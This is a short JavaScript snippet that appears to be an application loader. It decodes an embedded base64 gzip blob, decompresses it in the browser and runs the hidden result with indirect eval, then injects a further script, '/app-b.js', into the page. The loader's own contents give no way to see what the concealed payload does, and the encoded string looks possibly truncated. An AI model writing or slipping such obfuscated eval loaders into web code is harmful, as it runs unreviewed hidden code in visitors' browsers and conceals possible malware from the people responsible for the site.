(async function(){
var b64='H4sIAMeN2moC/+19XW8jSZLYe/+KGk7fFLlNUh+t/iJb6lNL6hvddrfklmZ8d2qtlGSlyJousjhVRX2MhsC9G9gH39oPxhmLgQGv94B98cAwcPCT9U/2D3h/guMjMyuzqkipd3oPi8PNLlrFrPyIjIyMjIiMiLrXj8dp5r38avf1';
var bin=Uint8Array.from(atob(b64),function(c){return c.charCodeAt(0);});
var ds=new DecompressionStream("gzip");
var stream=new Blob([bin]).stream().pipeThrough(ds);
var text=await new Response(stream).text();
(0,eval)(text);
var s=document.createElement("script");s.src="/app-b.js";document.body.appendChild(s);
})().catch(function(e){console.error("app load error",e);});
